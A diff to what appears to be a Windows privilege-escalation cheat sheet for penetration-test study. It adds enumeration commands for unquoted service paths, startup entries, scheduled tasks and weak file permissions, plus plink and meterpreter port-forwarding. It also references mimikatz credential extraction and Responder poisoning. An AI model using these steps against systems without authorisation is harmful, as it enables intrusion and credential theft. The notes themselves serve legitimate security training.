@@ -37,6 +37,9 @@
 Basically, it is a vulnerability that occurs if a service executable path is not enclosed with quotation marks and contains space.
 To identify these unquoted services you can run this command on Windows Command Shell:
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+
+gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
+
 https://medium.com/@harshaunsingh/windows-privileged-escalation-manual-and-using-metasploit-framework-ch-1-fd5f31a7db86
 
 ------------------------------------------------------------------------------------------
@@ -109,6 +112,47 @@ systeminfo
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 
 post/windows/gather/enum_patches (metasploit module)
+
+->Check what runs on startup?
+wmic startup get caption,command
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
+
+via powershell
+
+Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
+Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
+
+->What software is installed?
+
+dir /a "C:\Program Files"
+dir /a "C:\Program Files (x86)"
+reg query HKEY_LOCAL_MACHINE\SOFTWARE
+via powershell
+
+Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+
+Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+
+->scheduled tasks
+Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite.
+
+schtasks /query /fo LIST /v
+
+schtasks /query /fo LIST 2>nul | findstr TaskName
+
+dir C:\windows\tasks
+
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
 
 -----------------------------------------------------------------------------------
 
@@ -194,22 +238,117 @@ to check in detail visit https://toshellandback.com/2015/11/24/ms-priv-esc/
 
 ------------------------------------------------------------------------------------
 
-8)->mimikatz
+8)->Are there any weak folder or file permissions?
+
+Full Permissions for Everyone or Users on Program Folders?
+
+icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
+icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
+
+icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
+icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
+Modify Permissions for Everyone or Users on Program Folders?
+
+icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
+icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"
+
+icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
+icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
+Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 
+
+Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}} 
+You can also upload accesschk from Sysinternals to check for writeable folders and files.
+
+accesschk.exe -qwsu "Everyone" *
+accesschk.exe -qwsu "Authenticated Users" *
+accesschk.exe -qwsu "Users" *
+
+----------------------------------------------------------------------------------------------
+
+
+9)->mimikatz
 extract cleartext passwords from memory
 
 --------------------------------------------------------------------------------------
 
-9)->llmnr/netbios poisining
+10)->llmnr/netbios poisining
 use RESPONDER(Kali linux)
 
 -------------------------------------------------------------------------------------------------
 
-10)->priv escalation via group policy prefrences
+11)->priv escalation via group policy prefrences
 https://www.toshellandback.com/2015/08/30/gpp/
 
 -------------------------------------------------------------------------------------------------
 
+
+12)->Service only available from inside
+
+Sometimes there are services that are only accessible from inside the network. For example a MySQL server might not be accessible from the outside, for security reasons. It is also common to have different administration applications that is only accessible from inside the network/machine. Like a printer interface, or something like that. These services might be more vulnerable since they are not meant to be seen from the outside.
+
+
+netstat -ano
+
+Example output:
+
+Proto  Local address      Remote address     State        User  Inode  PID/Program name
+
+    -----  -------------      --------------     -----        ----  -----  ----------------
+    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -
+    
+    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -
+    
+    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -
+    
+    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -
+    
+    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -
+    
+    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -
+    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -
+    '
+    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -
+    
+    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -
+    
+    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -
+    
+    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -
+    
+    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -
+    
+    
+Look for LISTENING/LISTEN. Compare that to the scan you did from the outside.
+Does it contain any ports that are not accessible from the outside?
+If that is the case, maybe you can make a remote forward to access it.
+
+Port forward using plink
+
+plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
+
+
+Port forward using meterpreter
+
+portfwd add -l <attacker port> -p <victim port> -r <victim ip>
+  
+portfwd add -l 3306 -p 3306 -r 192.168.1.101
+So how should we interpret the netstat output?
+
+Local address 0.0.0.0
+
+Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card, from the loopback interface or any other interface. This means that anyone can connect to it.
+
+Local address 127.0.0.1
+
+Local address 127.0.0.1 means that the service is only listening for connection from the your PC. Not from the internet or anywhere else. This is interesting to us!
+
+Local address 192.168.1.9
+
+Local address 192.168.1.9 means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet. This is also interesting to us!
+
 Some more very usefull links
+  
+  --------------------------------------------------------------------------------------------------------------
 
 ->Using kernel exploits
 http://www.hackingarticles.in/windows-kernel-exploit-privilege-escalation/
@@ -227,6 +366,8 @@ Includes Sherlock,JAWS,Windows Exploit suggester, Power Up and other automated s
 
 ------------------------------Some more resources---------------------------------------------------------------------------------
 https://toshellandback.com/2015/11/24/ms-priv-esc/
+https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+
 
 https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
 
